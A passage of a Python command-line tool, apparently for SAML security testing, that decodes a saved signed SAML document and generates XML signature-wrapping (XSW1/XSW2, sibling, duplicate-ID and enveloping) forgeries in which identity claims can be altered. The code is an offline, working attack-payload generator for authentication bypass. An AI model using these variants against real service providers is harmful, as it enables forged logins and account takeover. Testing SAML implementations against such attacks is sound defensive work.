            f"ambiguous wrapping target: {len(anchors)} uniquely-signed auth elements present")
    return anchors[0]


def _child_position(parent: ET.Element, child: ET.Element) -> int:
    for position, candidate in enumerate(parent):
        if candidate is child:
            return position
    raise WebauthSamlError("could not locate the signed element under its parent")


def _strip_signatures(element: ET.Element) -> int:
    removed = 0
    pairs: list[tuple[ET.Element, ET.Element]] = []
    for parent in element.iter():
        for child in list(parent):
            if _local(child.tag) == "Signature" and _namespace(child.tag) == DS_NS:
                pairs.append((parent, child))
    for parent, child in pairs:
        parent.remove(child)
        removed += 1
    return removed


def _forge_clone(source: ET.Element, forged_id: str, id_key: str | None) -> ET.Element:
    forged = copy.deepcopy(source)
    _strip_signatures(forged)
    if id_key is not None:
        forged.set(id_key, forged_id)
    return forged


def _mark_forged() -> ET.Element:
    return ET.Comment(" XSW forged node: edit NameID/Attribute claims here; "
                      "this element is NOT covered by the real signature ")


_SERIALIZE_LOCK = threading.Lock()


def _serialize(root: ET.Element) -> str:
    """Serialize with the conventional saml/samlp/ds prefixes.

    ElementTree only takes prefixes from its process-wide registry, so the
    registrations are made for this call alone and the registry is restored
    afterwards: other ElementTree users in the process (tests included) never
    see their serialization change because an emitter ran first.
    """
    namespace_map = ET._namespace_map  # the registry register_namespace() writes
    with _SERIALIZE_LOCK:
        saved = dict(namespace_map)
        try:
            for namespace, prefix in _PREFIXES.items():
                ET.register_namespace(prefix, namespace)
            return ET.tostring(root, encoding="unicode")
        finally:
            namespace_map.clear()
            namespace_map.update(saved)


def _unique_forged_id(records: list[dict[str, Any]], base: str) -> str:
    existing = {item["value"] for record in records for item in record["ids"]}
    if base not in existing:
        return base
    for suffix in range(1, 10_000):
        candidate = f"{base}-{suffix}"
        if candidate not in existing:
            return candidate
    raise WebauthSamlError("could not derive a unique forged ID")


def _insert_sibling(tree: _Tree, anchor: dict[str, Any], forged_id: str,
                    *, after: bool, strategy: str, note: str) -> dict[str, Any] | None:
    ti = anchor["target_index"]
    pti = tree.parents.get(ti)
    if pti is None:
        return None
    signed = tree.element(ti)
    parent = tree.element(pti)
    id_key = _id_key_for_value(signed, anchor["id_value"])
    forged = _forge_clone(signed, forged_id, id_key)
    position = _child_position(parent, signed) + (1 if after else 0)
    parent.insert(position, forged)
    parent.insert(position, _mark_forged())
    return {"strategy": strategy, "forged_id": forged_id, "signed_id": anchor["id_value"],
            "reference_uri": anchor["uri"], "note": note}


def _wrap_signed_root(tree: _Tree, anchor: dict[str, Any], forged_id: str, *,
                      detached: bool) -> tuple[ET.Element | None, dict[str, Any] | None, str]:
    """Build an XSW1 (``detached=False``) or XSW2 (``detached=True``) wrapper
    around a signed document root.  Returns (forged_root, meta, skip_reason)."""
    original = tree.root
    signature = tree.element(anchor["signature_index"])
    if tree.parents.get(anchor["signature_index"]) != anchor["target_index"]:
        return None, None, ("the signature is not a direct child of the signed root; "
                            "the root wrapper re-seats it at the same child position")
    id_key = _id_key_for_value(original, anchor["id_value"])
    if id_key is None:
        return None, None, "the signed root carries no resolvable ID attribute"
    signature_position = _child_position(original, signature)
    forged = _forge_clone(original, forged_id, id_key)
    signature_copy = copy.deepcopy(signature)
    forged.insert(signature_position, signature_copy)
    signed_copy = copy.deepcopy(original)
    _strip_signatures(signed_copy)
    if detached:
        forged.insert(signature_position, signed_copy)
        strategy = "root_wrapper_detached_signed_sibling"
        note = ("XSW2: forged root (new ID) holds the original signed element, minus its "
                "enveloped signature, as a detached sibling just before a copy of the real "
                "signature; reference unchanged")
    else:
        signature_copy.append(signed_copy)
        strategy = "root_wrapper_signed_inside_signature"
        note = ("XSW1: forged root (new ID) keeps a copy of the real signature, which now "
                "carries the original signed element, minus its enveloped signature; "
                "reference unchanged")
    # The forged node is the document element itself and ElementTree serializes
    # no siblings of the root, so the marker is the forged root's first child.
    forged.insert(0, _mark_forged())
    return forged, {"strategy": strategy, "forged_id": forged_id,
                    "signed_id": anchor["id_value"], "reference_uri": anchor["uri"],
                    "note": note}, ""


def _emit_variants(xml: bytes, decoded: dict[str, Any],
                   forged_id: str | None) -> dict[str, Any]:
    base_tree = _Tree(_parse_tree(xml))
    anchor = _wrapping_anchor(base_tree)
    ti = anchor["target_index"]
    si = anchor["signature_index"]
    records = base_tree.records
    signed_path = records[ti]["path"]
    signature_path = records[si]["path"]
    signed_under_root = base_tree.parents.get(ti) is None
    signature_inside_target = _inside(si, ti, base_tree.parents)

    if isinstance(forged_id, str):
        if not _FORGED_ID_RE.fullmatch(forged_id):
            raise WebauthSamlError("forged_id must be a conservative XML NCName")
        fid = _unique_forged_id(records, forged_id)
    else:
        fid = _unique_forged_id(records, f"{anchor['id_value']}-xsw")

    variants: list[dict[str, Any]] = []
    skipped: list[dict[str, str]] = []

    def record_variant(root: ET.Element, meta: dict[str, Any] | None, name: str) -> None:
        if meta is None:
            skipped.append({"name": name,
                            "reason": "signed element is the document root; "
                                      "this placement needs a parent element"})
            return
        variants.append({
            "name": name,
            "strategy": meta["strategy"],
            "document": _serialize(root),
            "forged_id": meta["forged_id"],
            "signed_id": meta["signed_id"],
            "reference_uri": meta["reference_uri"],
            "signature_path": signature_path,
            "signed_target_path": signed_path,
            "note": meta["note"],
            "requires_byte_exact_signed_subtree": True,
            "inert": True,
            "network_requests": 0,
        })

    # Sibling placements: the real signature still references the original by ID;
    # an SP that consumes the first/last element by position reads the forgery.
    pre = base_tree.clone()
    record_variant(pre.root, _insert_sibling(
        pre, anchor, fid, after=False, strategy="forged_sibling_before_signed",
        note="forged copy precedes the signed element; targets position-first consumption"),
        "wrap_sibling_pre")
    post = base_tree.clone()
    record_variant(post.root, _insert_sibling(
        post, anchor, fid, after=True, strategy="forged_sibling_after_signed",
        note="forged copy follows the signed element; targets position-last consumption"),
        "wrap_sibling_post")

    # Duplicate-ID shadow: the original keeps its ID and the reference is left
    # untouched (Reference/@URI sits inside ds:SignedInfo, which SignatureValue
    # signs, so it can never be edited).  An unsigned forgery carrying the SAME ID
    # is placed beside it: a verifier that resolves the ID to the original passes,
    # while an application that resolves it (or consumes by position) to the
    # other copy reads the forgery.  Pre targets verify-last/consume-first stacks,
    # post targets verify-first/consume-last ones.
    for name, after in (("wrap_id_shadow", False), ("wrap_id_shadow_post", True)):
        shadow = base_tree.clone()
        record_variant(shadow.root, _insert_sibling(
            shadow, anchor, anchor["id_value"], after=after,
            strategy="duplicate_id_shadow_" + ("after" if after else "before"),
            note=("unsigned forgery carries the signed element's own ID ("
                  + ("after" if after else "before") + " it); signature and reference "
                  "unchanged; succeeds only where verifier and application resolve the "
                  "duplicate ID to different copies")),
            name)

    # Root wrappers (Somorovsky XSW1/XSW2): when the signed element IS the
    # document root, a new forged root of the same type takes its place, keeps
    # a copy of the real signature (reference unchanged), and carries the
    # original signed element -- minus its enveloped signature, which the
    # enveloped-signature transform excluded from the digest anyway -- inside
    # the signature (XSW1) or as a detached sibling just before it (XSW2).
    for name, detached in (("wrap_root_xsw1", False), ("wrap_root_xsw2", True)):
        if not signed_under_root:
            skipped.append({"name": name,
                            "reason": "signed element is not the document root; "
                                      "the sibling/shadow placements cover this case"})
            continue
        forged_root, meta, reason = _wrap_signed_root(
            base_tree.clone(), anchor, fid, detached=detached)
        if forged_root is None:
            skipped.append({"name": name, "reason": reason})
            continue
        record_variant(forged_root, meta, name)

    # Enveloping: hide the signed element inside the signature's ds:Object (so it
    # still resolves by ID) and leave a forgery in its place.  Only when the
    # signature is detached, not enveloped within the signed element.
    if signed_under_root:
        skipped.append({"name": "wrap_enveloping_object",
                        "reason": "signed element is the document root; cannot replace it with a forgery"})
    elif signature_inside_target:
        skipped.append({"name": "wrap_enveloping_object",
                        "reason": "signature is enveloped inside the signed element; "
                                  "it cannot also envelop that element"})
    else:
        env = base_tree.clone()
        eti = env.parents.get(ti)
        signed = env.element(ti)
        parent = env.element(eti)
        signature = env.element(si)
        id_key = _id_key_for_value(signed, anchor["id_value"])
        forged = _forge_clone(signed, fid, id_key)
        position = _child_position(parent, signed)
        parent.remove(signed)
        parent.insert(position, forged)
        parent.insert(position, _mark_forged())
        obj = ET.SubElement(signature, f"{{{DS_NS}}}Object")
        obj.append(signed)
        record_variant(env.root, {"strategy": "enveloping_object_hide_signed",
                             "forged_id": fid, "signed_id": anchor["id_value"],
                             "reference_uri": anchor["uri"],
                             "note": ("signed element moved into ds:Object inside the signature "
                                      "(still resolves by ID); forgery left at its original position")},
                       "wrap_enveloping_object")

    return {
        "signed_target": {
            "path": signed_path,
            "local_name": anchor["target_local"],
            "id": anchor["id_value"],
        },
        "signature_path": signature_path,
        "reference_uri": anchor["uri"],
        "signature_enveloped_in_target": signature_inside_target,
        "signed_element": _serialize(copy.deepcopy(base_tree.element(ti))),
        "variants": variants,
        "skipped": skipped,
        "binding": decoded["binding"],
        "parameter": decoded["parameter"],
        "forged_content_placeholder": True,
        "requires_byte_exact_signed_subtree": True,
        "signatures_verified": 0,
        "offline_only": True,
        "network_requests": 0,
    }


def emit_signature_wrapping_variants(value: object, *, binding: str = "auto",
                                     parameter: str | None = None,
                                     forged_id: str | None = None) -> dict[str, Any]:
    """Emit XML signature-wrapping variants for one saved signed SAML document.

    Decodes the artifact, locates the single uniquely-signed Response/Assertion,
    and returns candidate wrapped documents: sibling, duplicate-ID shadow and
    enveloping placements for a nested signed element, XSW1/XSW2 root wrappers
    for a signed document root.  No variant edits ds:SignedInfo (it is signed).
    Never verifies, resolves, fetches, or submits.  Raises
    :class:`WebauthSamlError` when there is no single wrapping anchor; structural
    placements that do not apply are returned under ``skipped`` with a reason.
    """
    try:
        decoded = _decode_artifact(value, binding, parameter)
        return _emit_variants(decoded["xml"], decoded, forged_id)
    except WebauthSamlError:
        raise
    except Exception as exc:  # one declared error boundary for all hostile input
        raise WebauthSamlError("unable to emit signature-wrapping variants safely") from exc


def _read_file(path_text: str) -> bytes:
    try:
        path = Path(path_text)
        if not path.is_file() or path.stat().st_size > MAX_ARTIFACT_BYTES:
            raise WebauthSamlError("input file is absent or exceeds artifact cap")
        with path.open("rb") as handle:
            raw = handle.read(MAX_ARTIFACT_BYTES + 1)
    except WebauthSamlError:
        raise
    except OSError as exc:
        raise WebauthSamlError("unable to read input file") from exc
    if len(raw) > MAX_ARTIFACT_BYTES:
        raise WebauthSamlError("input file exceeds artifact cap")
    return raw


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="webauth_saml_xsw.py",
        description="Decode and analyze a saved SAML/XMLDSig artifact without network access",
    )
    parser.add_argument("artifact", help="artifact text, or a path with --file")
    parser.add_argument("--file", action="store_true", help="read artifact bytes from a local file")
    parser.add_argument("--binding", choices=("auto", "xml", "post", "redirect"), default="auto")
    parser.add_argument("--parameter", choices=("SAMLRequest", "SAMLResponse"))
    parser.add_argument("--emit-variants", action="store_true",
                        help="emit signature-wrapping variant documents instead of analyzing")
    parser.add_argument("--forged-id", help="ID to assign the forged node (default derived)")
    parser.add_argument("--pretty", action="store_true")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = _parser()
    try:
        try:
            args = parser.parse_args(argv)
        except SystemExit as exc:
            return exc.code if isinstance(exc.code, int) else 2
        artifact = _read_file(args.artifact) if args.file else args.artifact
        if args.emit_variants:
            result = emit_signature_wrapping_variants(
                artifact, binding=args.binding, parameter=args.parameter,
                forged_id=args.forged_id,
            )
        else:
            result = analyze_saml_artifact(
                artifact, binding=args.binding, parameter=args.parameter,
            )
        print(json.dumps(result, sort_keys=True, indent=2 if args.pretty else None))
        return 0
    except WebauthSamlError as exc:
        print(f"webauth_saml_xsw: {exc}", file=sys.stderr)
        return 2
    except (OSError, UnicodeError, ValueError, RecursionError) as exc:
        print(f"webauth_saml_xsw: malformed input ({type(exc).__name__})", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
